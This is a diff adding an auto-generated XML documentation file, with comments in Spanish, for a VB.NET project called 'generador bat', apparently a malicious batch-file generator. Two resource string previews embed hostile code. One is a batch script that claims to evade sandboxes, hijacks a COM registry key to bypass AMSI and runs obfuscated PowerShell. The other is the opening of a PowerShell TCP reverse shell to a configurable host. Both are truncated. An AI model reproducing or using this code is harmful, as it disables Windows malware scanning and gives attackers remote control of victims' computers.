@@ -1,0 +1,66 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+generador bat
+</name>
+</assembly>
+<members>
+<member name="T:generador_bat.My.Resources.Resources">
+<summary>
+  Clase de recurso fuertemente tipado, para buscar cadenas traducidas, etc.
+</summary>
+</member>
+<member name="P:generador_bat.My.Resources.Resources.ResourceManager">
+<summary>
+  Devuelve la instancia de ResourceManager almacenada en caché utilizada por esta clase.
+</summary>
+</member>
+<member name="P:generador_bat.My.Resources.Resources.Culture">
+<summary>
+  Reemplaza la propiedad CurrentUICulture del subproceso actual para todas las
+  búsquedas de recursos mediante esta clase de recurso fuertemente tipado.
+</summary>
+</member>
+<member name="P:generador_bat.My.Resources.Resources.Alert">
+<summary>
+  Busca un recurso adaptado de tipo System.IO.UnmanagedMemoryStream similar a System.IO.MemoryStream.
+</summary>
+</member>
+<member name="P:generador_bat.My.Resources.Resources.code2">
+<summary>
+  Busca una cadena traducida similar a @echo off
+:: Writte file to disk to evade sandbox detection
+echo microsoft &gt; %userprofile%\\license.pem
+:: AMSI COM Bypass [ 3xploit]
+REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} /f
+REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
+:: Sleep time to refresh regedit
+sleep 3
+:: local batch variable declarations
+sEt !h=e&amp;&amp; sEt U7=n&amp;&amp; sEt k8=d&amp;&amp; sEt db=P
+:: Powershell command obfuscated
+@c^M%k8% [resto de la cadena truncado]&quot;;.
+</summary>
+</member>
+<member name="P:generador_bat.My.Resources.Resources.shell">
+<summary>
+  Busca una cadena traducida similar a ${socket} = new-object System.Net.Sockets.TcpClient(&apos;%H%&apos;, %P%);
+if($socket -eq $null){exit 1}
+$stream = $socket.GetStream();
+$writer = new-object System.IO.StreamWriter($stream);
+$buffer = new-object System.Byte[] 1024;
+$encoding = new-object System.Text.AsciiEncoding;
+do
+{
+	$writer.Flush();
+	$read = $null;
+	$res = &quot;&quot;
+	while($stream.DataAvailable -or $read -eq $null) {
+		$read = $stream.Read($buffer, 0, 1024)
+	}
+	$out = $encoding.GetString($buffer, 0, $read).Replace(&quot;`r`n&quot;,&quot;&quot;).Replace(&quot;`n&quot;,&quot;&quot; [resto de la cadena truncado]&quot;;.
+</summary>
+</member>
+</members>
+</doc>
